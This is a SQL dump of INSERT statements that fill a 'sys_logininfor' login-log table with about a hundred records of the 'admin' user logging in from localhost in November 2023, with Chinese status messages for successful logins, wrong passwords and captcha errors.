INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (265, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 21:26:43');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (266, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 21:26:57');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (267, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误1次', '2023-11-07 21:58:56');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (268, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 21:58:56');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (269, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 21:59:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (270, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 21:59:48');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (271, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '验证码错误', '2023-11-07 22:00:45');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (272, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:00:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (273, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:01:30');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (274, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误1次', '2023-11-07 22:11:06');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (275, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 22:11:06');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (276, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:11:13');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (277, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '验证码错误', '2023-11-07 22:12:12');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (278, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:12:15');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (279, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:13:41');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (280, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:15:42');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (281, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:17:20');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (282, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:22:31');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (283, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:23:17');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (284, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 22:24:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (285, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误1次', '2023-11-08 20:26:54');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (286, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-08 20:26:54');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (287, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '验证码已失效', '2023-11-08 20:27:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (288, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 20:27:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (289, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 20:34:35');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (290, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 20:40:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (291, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 20:41:45');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (292, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 20:43:42');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (293, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '1', '验证码已失效', '2023-11-08 20:44:51');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (294, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2023-11-08 20:44:51');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (295, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 20:50:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (296, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 20:56:15');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (297, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 20:58:47');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (298, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:00:10');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (299, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:02:25');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (300, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:06:22');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (301, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:07:00');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (302, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:12:28');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (303, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:15:26');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (304, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:23:28');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (305, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:24:14');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (306, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:24:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (307, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:27:22');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (308, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:29:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (309, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:32:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (310, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:33:02');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (311, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:36:06');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (312, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:39:20');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (313, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:41:28');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (314, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:44:47');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (315, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:46:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (316, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:48:16');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (317, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:50:21');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (318, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-08 21:53:30');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (319, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误1次', '2023-11-09 14:23:34');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (320, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-09 14:23:34');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (321, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '验证码错误', '2023-11-09 14:23:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (322, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:23:49');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (323, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:28:25');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (324, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:30:13');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (325, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:31:03');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (326, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:33:40');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (327, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:38:13');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (328, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:39:01');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (329, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:40:36');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (330, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-09 14:42:11');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (331, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:42:43');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (332, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:43:29');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (333, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:44:53');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (334, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:45:25');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (335, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:47:14');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (336, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:49:56');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (337, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:51:26');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (338, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:52:10');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (339, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:53:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (340, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '1', '验证码错误', '2023-11-09 14:54:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (341, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:54:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (342, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:57:32');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (343, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '1', '验证码已失效', '2023-11-09 14:58:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (344, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 14:58:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (345, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:00:10');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (346, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:02:40');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (347, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '1', '密码输入错误1次', '2023-11-09 15:04:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (348, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '1', '用户不存在/密码错误', '2023-11-09 15:04:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (349, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:04:24');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (350, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:05:33');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (351, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:11:13');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (352, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:12:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (353, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:14:33');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (354, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:15:14');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (355, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:15:33');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (356, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '1', '验证码已失效', '2023-11-09 15:27:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (357, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:27:31');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (358, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:28:19');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (359, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:28:43');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (360, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:29:12');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (361, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:30:10');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (362, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 15:48:52');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (363, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:02:51');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (364, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '1', '验证码错误', '2023-11-09 16:07:49');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (365, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:07:53');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (366, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:09:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (367, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:10:12');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (368, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:11:01');
